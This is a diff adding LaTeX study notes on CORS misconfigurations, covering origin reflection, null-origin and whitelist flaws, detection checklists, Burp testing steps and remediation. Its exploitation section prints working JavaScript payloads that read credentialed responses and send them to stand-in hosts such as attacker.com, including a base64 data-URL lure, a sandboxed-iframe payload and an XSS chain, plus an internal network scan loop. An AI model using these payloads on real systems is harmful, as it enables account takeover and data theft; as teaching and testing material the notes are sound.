@@ -1,0 +1,558 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\lstset{numbers=none, basicstyle=\ttfamily}
+\renewcommand{\lstlistingname}
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{Cross-Origin Resource Sharing (CORS) Vulnerability Notes}
+\author{Eyad Islam El-Taher}
+
+\begin{document}
+
+\maketitle
+
+\section*{Introduction}
+\textbf{Cross-Origin Resource Sharing (CORS)} is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the \textbf{Same-Origin Policy (SOP)}, but also introduces potential attack vectors when poorly configured.
+
+\subsection*{Key Concepts}
+\begin{itemize}
+    \item \textbf{Same-Origin Policy (SOP)}: Restrictive policy preventing websites from accessing resources from different origins
+    \item \textbf{CORS}: Protocol that relaxes SOP using HTTP headers to define trusted web origins
+    \item \textbf{Origin}: Combination of protocol, domain, and port (e.g., \texttt{https://example.com:443})
+    \item \textbf{CORS is NOT protection} against CSRF attacks
+\end{itemize}
+
+\section*{CORS Vulnerability Happen When}
+\begin{itemize}
+    \item \textbf{Origin Reflection}: Server reflects arbitrary Origin header in \texttt{Access-Control-Allow-Origin}
+    \item \textbf{Weak Whitelisting}: Improper regex/prefix/suffix matching in origin validation
+    \item \textbf{Null Origin Trust}: Application whitelists \texttt{null} origin value
+    \item \textbf{Credentials with Wildcard}:\newline
+     \texttt{Access-Control-Allow-Credentials: true} \newline
+     \texttt{Access-Control-Allow-Origin: *}
+    \item \textbf{Subdomain Validation Flaws}: Poor subdomain validation allowing attacker-controlled domains
+    \item \textbf{Protocol Mismatch}: HTTP vs HTTPS origin validation issues
+\end{itemize}
+
+\section*{CORS Vulnerability Happen Where}
+\begin{itemize}
+    \item \textbf{API Endpoints} returning sensitive user data
+    \item \textbf{AJAX Requests} with authentication cookies
+    \item \textbf{Cross-Domain Applications} requiring resource sharing
+    \item \textbf{Mobile App Backends} with web interfaces
+    \item \textbf{Third-Party Integrations} with relaxed CORS policies
+    \item \textbf{Development Environments} with permissive settings in production
+\end{itemize}
+
+\section*{Impact of CORS Vulnerability}
+\begin{itemize}
+    \item \textbf{Sensitive Data Theft}: API keys, CSRF tokens, personal information
+    \item \textbf{Credential Harvesting}: Session cookies, authentication tokens
+    \item \textbf{Account Takeover}: Through stolen session data
+    \item \textbf{Information Disclosure}: Business data, internal information
+    \item \textbf{Privilege Escalation}: Access to privileged user data
+\end{itemize}
+
+\hrule
+
+\section*{Advanced CORS Exploitation Scenarios}
+
+\subsection*{\underline{Exploiting XSS via CORS Trust Relationships}}
+\begin{itemize}
+    \item \textbf{Scenario}: Website trusts an origin vulnerable to XSS
+    \item \textbf{Attack}: Use XSS to inject JavaScript that leverages CORS to retrieve sensitive data
+    \item \textbf{Example}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://subdomain.vulnerable-website.com
+Cookie: sessionid=...
+
+Response:
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+    \item \textbf{Exploitation}: XSS payload on subdomain retrieves API key via CORS
+\end{itemize}
+
+\subsection*{\underline{Breaking TLS with Poorly Configured CORS}}
+
+\subsection*{Understanding the Vulnerability}
+\begin{itemize}
+    \item \textbf{CORS Misconfiguration}: When a TLS-protected site (HTTPS) has overly permissive CORS policies
+    \item \textbf{Attack Vector}: HTTP page can make requests to HTTPS site and read responses
+    \item \textbf{Core Problem}: CORS policy allows requests from untrusted or HTTP origins
+\end{itemize}
+
+\subsection*{How the Attack Works}
+\begin{verbatim}
+Victim visits:    http://attacker-site.com (malicious page)
+JavaScript on page makes request to: https://bank.com/api/userData
+Browser checks CORS: 
+    https://bank.com responds with: Access-Control-Allow-Origin: *
+Browser allows: Malicious page reads sensitive data from HTTPS site
+\end{verbatim}
+
+\subsection*{Common Misconfigurations}
+\begin{itemize}
+    \item \texttt{Access-Control-Allow-Origin: *} on sensitive endpoints
+    \item \texttt{Access-Control-Allow-Origin: null} which allows file:// origins
+    \item Dynamic origin reflection without proper validation
+    \item Allowing credentials with wildcard origins
+\end{itemize}
+
+\subsection*{Impact}
+\begin{itemize}
+    \item Bypass of TLS protection for sensitive data
+    \item Cross-origin reading of authenticated responses
+    \item Theft of CSRF tokens and session data
+    \item Complete account takeover in severe cases
+\end{itemize}
+
+\subsection*{\underline{Intranet Exploitation via CORS Misconfiguration}}
+
+Understanding CORS-Based Intranet Attacks:
+\begin{itemize}
+    \item \textbf{Attack Vector}: Leveraging misconfigured CORS policies on internal services
+    \item \textbf{Privilege Escalation}: Using external access to reach internal network resources
+    \item \textbf{Browser as Bridge}: Victim's browser becomes a proxy to internal systems
+\end{itemize}
+
+\subsection*{How CORS Enables Intranet Access}
+\begin{verbatim}
+External Attack Flow:
+1. Victim visits: http://evil.com (malicious page)
+2. JavaScript makes request to: http://internal-service.local/api/data
+3. Internal service responds with: Access-Control-Allow-Origin: *
+4. Browser allows: Malicious page reads internal service data
+5. Attacker exfiltrates internal network information
+\end{verbatim}
+
+\subsection*{CORS-Specific Attack Techniques}
+\begin{verbatim}
+1. Internal Service Discovery via CORS:
+   for (let i = 1; i < 255; i++) {
+       fetch(`http://192.168.1.${i}/api/data`)
+         .then(r => {
+           if(r.headers.get('Access-Control-Allow-Origin')) {
+             // Internal service found with CORS enabled
+           }
+         })
+   }
+
+2. Credentialed CORS Attacks:
+   fetch('http://internal-app/private-data', {
+     credentials: 'include'
+   })
+   // Works if internal app has: 
+   // Access-Control-Allow-Credentials: true
+   // Access-Control-Allow-Origin: evil.com
+\end{verbatim}
+
+\subsection*{Exploitation Impact via CORS}
+\begin{itemize}
+    \item \textbf{Internal Data Theft}: Read sensitive data from internal APIs
+    \item \textbf{Service Enumeration}: Map internal network structure and services
+    \item \textbf{Authentication Bypass}: Access internal apps using victim's browser context
+    \item \textbf{Cross-Internal Service Attacks}: Use one internal service to attack others
+    \item \textbf{Persistent Access}: Plant backdoors in internal systems
+\end{itemize}
+
+\subsection*{Real-World Attack Scenario}
+\begin{verbatim}
+1. Attacker finds XSS on external corporate site
+2. Injects script that scans internal network (192.168.0.0/16)
+3. Discovers internal Jenkins at 192.168.1.50 with CORS: *
+4. Reads Jenkins build secrets, API keys, credentials
+5. Uses credentials to access other internal systems
+\end{verbatim}
+
+\hrule
+
+\section*{CORS Headers and Their Roles}
+
+\subsection*{Request Headers}
+\begin{itemize}
+    \item \texttt{Origin}: Indicates the origin of the cross-origin request
+    \item \texttt{Access-Control-Request-Method}: Used in preflight requests
+    \item \texttt{Access-Control-Request-Headers}: Used in preflight requests
+\end{itemize}
+
+\subsection*{Response Headers}
+\begin{itemize}
+    \item \texttt{Access-Control-Allow-Origin}: Specifies allowed origins
+    \item \texttt{Access-Control-Allow-Credentials}: Indicates if credentials are allowed
+    \item \texttt{Access-Control-Allow-Methods}: Allowed HTTP methods
+    \item \texttt{Access-Control-Allow-Headers}: Allowed HTTP headers
+    \item \texttt{Access-Control-Expose-Headers}: Headers exposed to JavaScript
+\end{itemize}
+
+\hrule
+
+\section*{Types of CORS Misconfigurations}
+
+\subsection*{1.\underline{Basic Origin Reflection}}
+\begin{itemize}
+    \item \textbf{Vulnerability}: Server reflects any Origin header value
+    \item \textbf{Exploitation}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Request:
+    GET /sensitive-data HTTP/1.1
+    Origin: https://evil.com
+    
+    Response:
+    HTTP/1.1 200 OK
+    Access-Control-Allow-Origin: https://evil.com
+    Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+    \item \textbf{Impact}: Complete domain compromise
+\end{itemize}
+
+\subsection*{2. \underline{Weak Regex/Whitelist Bypass}}
+\begin{itemize}
+    \item \textbf{Common Flaws}:
+    \begin{itemize}
+        \item Prefix matching: \texttt{trusted.com} allows \texttt{trusted.com.evil.net}
+        \item Suffix matching: \texttt{trusted.com} allows \texttt{eviltrusted.com}
+        \item Regex errors: Poorly crafted regular expressions
+    \end{itemize}
+    \item \textbf{Exploitation Examples}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Allowed: *.trusted.com
+    Bypass: attacker.trusted.com
+    
+    Allowed: trusted.com.*
+    Bypass: trusted.com.attacker.net
+    \end{lstlisting}
+\end{itemize}
+
+\subsection*{3. \underline{Null Origin Vulnerability}}
+\begin{itemize}
+    \item \textbf{Null Origin}: A special origin value that appears as \texttt{null} in requests
+    \item \textbf{Occurs When}: Requests come from local HTML files, sandboxed iframes, or certain redirects
+    \item \textbf{CORS Impact}: If server allows \texttt{null} origin, it bypasses normal origin restrictions
+\end{itemize}
+
+\subsection*{How Null Origin Works}
+\begin{verbatim}
+Normal Browser Behavior:
+- File:// URLs: Origin header is set to "null"
+- Sandboxed iframes: Origin becomes "null"
+- Some redirect scenarios: Origin may become "null"
+
+Server Response:
+If server responds with: Access-Control-Allow-Origin: null
+Then any "null" origin can access the resource
+\end{verbatim}
+
+\textbf{Attack Vector}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+            srcdoc="<script>/* CORS attack */</script>">
+    </iframe>
+    \end{lstlisting}
+
+\subsection*{Common Null Origin Scenarios}
+\begin{itemize}
+    \item \textbf{File Protocol}: \texttt{file:///C:/Users/ victim/attack.html}
+    \item \textbf{Sandboxed Documents}: \texttt{<iframe sandbox="allow-scripts">}
+    \item \textbf{Data URLs}: \texttt{data:text/html,<script>fetch()</script>}
+    \item \textbf{Certain Redirects}: Origin may be stripped during redirects
+\end{itemize}
+
+\subsection*{4. \underline{Credentials with Wildcard}}
+\begin{itemize}
+    \item \textbf{Vulnerability}:\newline \texttt{Access-Control-Allow-Origin: *} \newline \texttt{Access-Control-Allow-Credentials: true}
+     \item \textbf{Wildcard Character}: The asterisk symbol (*) meaning "any origin"
+    \item \textbf{CORS Context}: \texttt{Access-Control-Allow-Origin: *} allows any website to make requests
+    \item \textbf{Security Implication}: Complete bypass of same-origin policy for the endpoint
+\end{itemize}
+
+\hrule
+
+\section*{How to Identify CORS Vulnerabilities}
+
+\subsection*{Quick Detection Checklist}
+\begin{itemize}
+    \item \textbf{Origin Reflection Test}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Request with: Origin: https://attacker.com
+    Check if response contains: Access-Control-Allow-Origin: https://attacker.com
+    \end{lstlisting}
+    
+    \item \textbf{Credentials Check}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Look for: Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+    
+    \item \textbf{Null Origin Test}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Request with: Origin: null
+    Check if response contains: Access-Control-Allow-Origin: null
+    \end{lstlisting}
+    
+    \item \textbf{Wildcard Check}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Check if response contains: Access-Control-Allow-Origin: *
+    \end{lstlisting}
+\end{itemize}
+
+\subsection*{Definitive Vulnerability Indicators}
+\begin{itemize}
+    \item \textbf{HIGH RISK}: Origin reflection + Credentials allowed
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Access-Control-Allow-Origin: https://attacker.com
+    Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+    
+    \item \textbf{HIGH RISK}: Null origin + Credentials allowed
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Access-Control-Allow-Origin: null
+    Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+    
+    \item \textbf{MEDIUM RISK}: Weak regex/whitelist bypass
+    \begin{itemize}
+        \item Prefix/suffix matching vulnerabilities
+        \item Subdomain validation flaws
+    \end{itemize}
+    
+    \item \textbf{LOW RISK}: Wildcard without credentials
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Access-Control-Allow-Origin: *
+    Access-Control-Allow-Credentials: false
+    \end{lstlisting}
+\end{itemize}
+
+\subsection*{Burp Suite Testing Steps}
+\begin{enumerate}
+    \item Intercept request to sensitive endpoint
+    \item Add/modify Origin header to attacker domain
+    \item Check if ACAO header reflects your origin
+    \item Verify if ACAC header is set to true
+    \item If both conditions met → VULNERABLE
+\end{enumerate}
+
+\subsection*{False Positive Checks}
+\begin{itemize}
+    \item \textbf{Not Vulnerable}: Server returns 403/error for unknown origins
+    \item \textbf{Not Vulnerable}: No CORS headers in response
+    \item \textbf{Not Vulnerable}: Static ACAO value (not reflecting origin)
+    \item \textbf{Caution}: Some frameworks reflect origin only for preflight requests
+\end{itemize}
+
+\hrule
+
+\section*{Testing Methodology}
+
+\subsection*{Manual Testing Steps}
+\begin{enumerate}
+    \item \textbf{Identify CORS Endpoints}
+    \begin{itemize}
+        \item Use proxy to crawl application
+        \item Look for \texttt{Access-Control-Allow-*} headers in responses
+        \item Focus on endpoints returning sensitive data
+    \end{itemize}
+    
+    \item \textbf{Test Origin Reflection}
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Origin: https://evil.com
+    Check for: Access-Control-Allow-Origin: https://evil.com
+    \end{lstlisting}
+    
+    \item \textbf{Test Null Origin}
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Origin: null
+    Check for: Access-Control-Allow-Origin: null
+    \end{lstlisting}
+    
+    \newpage
+    \item \textbf{Test Whitelist Bypasses}
+    \begin{itemize}
+        \item Domain variations: \texttt{target.com.attacker.net}
+        \item Case variations: \texttt{TARGET.com}
+        \item Special characters: \texttt{target.com@attacker.net}
+    \end{itemize}
+    
+    \item \textbf{Verify Credentials Support}
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Check for: Access-Control-Allow-Credentials: true
+    \end{lstlisting}
+\end{enumerate}
+
+\hrule
+
+\section*{Exploitation Techniques}
+
+\subsection*{Basic CORS Exploit Script}
+\begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable.com/sensitive-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    fetch('https://attacker.com/log?data=' + encodeURIComponent(this.responseText));
+};
+</script>
+\end{lstlisting}
+
+\subsection*{Common Null Origin Scenarios with Exploitation Examples}
+\begin{itemize}
+    \item \textbf{File Protocol}: 
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    User downloads and opens: attack.html
+    File location: file:///C:/Users/john/Downloads/attack.html
+    HTML content:
+    <script>
+    fetch('https://bank.com/api/account', {
+      credentials: 'include'
+    })
+    .then(r => r.json())
+    .then(data => {
+      // Steal account data
+      fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data)))
+    });
+    </script>
+    \end{lstlisting}
+    
+    \item \textbf{Sandboxed Documents}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    <!-- Attacker embeds in their website -->
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+     srcdoc="<script>
+     var req = new XMLHttpRequest();
+     req.onload = function() {
+       location='https://attacker.com/log?key='+encodeURIComponent(this.responseText);
+     };
+     req.open('get','https://vulnerable.com/data',true);
+     req.withCredentials = true;
+     req.send();
+     </script>">
+</iframe>
+    \end{lstlisting}
+    
+    \newpage
+    \item \textbf{Data URLs}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    <!-- Direct link user can click -->
+    <a href="data:text/html;base64,PHNjcmlwdD4KZmV0Y2goJ2h0dHBzOi8vdGFyZ2V0LmNvbS
+    9hcGkvdXNlckRhdGEnKQoudGhlbihyID0+IHIuanNvbigpKQoudGhlbihkYXRhID0+IHsKICBmZXR
+    jaCgnaHR0cHM6Ly9hdHRhY2tlci5jb20vc3RlYWw/JytCVUYuc3RyaW5naWZ5KGRhdGEpKQp9KTsK
+    PC9zY3JpcHQ+">
+    Click for "Important Report"
+    </a>
+    
+    Decoded base64 content:
+    <script>
+    fetch('https://target.com/api/userData')
+    .then(r => r.json())
+    .then(data => {
+      fetch('https://attacker.com/steal?'+JSON.stringify(data))
+    });
+    </script>
+    \end{lstlisting}
+    
+    \item \textbf{Certain Redirects}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+    Attacker controls: https://evil.com/redirector
+    Victim visits: https://evil.com/redirector?url=https://target.com/api/data
+    
+    Server code at evil.com:
+    app.get('/redirector', (req, res) => {
+      // This redirect strips the Origin header
+      res.redirect(req.query.url);
+    });
+    
+    Browser behavior:
+    - Initial request Origin: https://evil.com
+    - After redirect Origin: null
+    - If target.com allows null origin, data is accessible
+    \end{lstlisting}
+\end{itemize}
+
+\subsection*{Practical Exploitation Example (XSS \& CORS)}
+\begin{itemize}
+    \item \textbf{Reconnaissance}:
+    \begin{itemize}
+        \item Identify CORS-enabled endpoints with credentials
+        \item Test origin reflection with arbitrary subdomains
+        \item Find XSS vulnerabilities on whitelisted subdomains
+    \end{itemize}
+    \item \textbf{Exploit Chain}:
+    \begin{lstlisting}[basicstyle=\ttfamily\small, frame=single]
+<script>
+document.location="http://stock.lab-id/?productId=4<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://lab-id/accountDetails',true); 
+req.withCredentials = true;
+req.send();
+function reqListener() {
+    location='https://exploit-server/log?key='+this.responseText; 
+};</script>&storeId=1"
+</script>
+    \end{lstlisting}
+\end{itemize}
+
+\newpage
+
+\section*{Remediation and Prevention Measures}
+
+\subsubsection*{1. Proper Cross-Origin Request Configuration}
+\begin{itemize}
+    \item \textbf{Sensitive Resources}: Always specify exact origins in \texttt{Access-Control-Allow-Origin} header
+    \item \textbf{No Dynamic Reflection}: Never reflect arbitrary \texttt{Origin} headers without validation
+    \item \textbf{Static Configuration}: Use fixed, pre-approved origins for sensitive endpoints
+	\item \textbf{Protocol Consistency}: Ensure whitelisted origins use same protocol (HTTPS only)
+    \item \textbf{Credential Control}: Use \texttt{Access-Control-Allow-Credentials: true} sparingly
+\end{itemize}
+
+\subsubsection*{2. Trusted Sites Only}
+\begin{itemize}
+    \item \textbf{Whitelist Management}: Only include genuinely trusted sites in CORS policies
+    \item \textbf{Origin Verification}: Validate all whitelisted origins thoroughly
+    \item \textbf{No Blind Trust}: Don't trust origins without proper security assessment
+\end{itemize}
+
+\subsubsection*{3. Avoid Null Origin Whitelisting}
+\begin{itemize}
+    \item \textbf{Null Origin Risk}: Internal documents and sandboxed requests can use \texttt{null} origin
+    \item \textbf{Prevention}: Never use \texttt{Access-Control-Allow-Origin: null}
+    \item \textbf{Alternative}: Specify exact trusted origins for both private and public servers
+\end{itemize}
+
+\subsubsection*{4. Internal Network Security}
+\begin{itemize}
+    \item \textbf{Wildcard Restriction}: Avoid wildcards (\texttt{*}) in internal networks
+    \item \textbf{Network Isolation}: Don't rely solely on network configuration for protection
+    \item \textbf{Browser Security}: Assume internal browsers can access untrusted external domains
+\end{itemize}
+
+\subsubsection*{5. Server-Side Security First}
+\begin{itemize}
+    \item \textbf{CORS Limitation}: CORS defines browser behavior only, not server protection
+    \item \textbf{Direct Request Risk}: Attackers can forge requests from any trusted origin
+    \item \textbf{Essential Protections}:
+    \begin{itemize}
+        \item Strong authentication mechanisms
+        \item Robust session management
+        \item Proper authorization checks
+        \item Input validation and sanitization
+    \end{itemize}
+    \item \textbf{Layered Security}: CORS should complement, not replace, server-side security
+\end{itemize}
+
+\end{document}
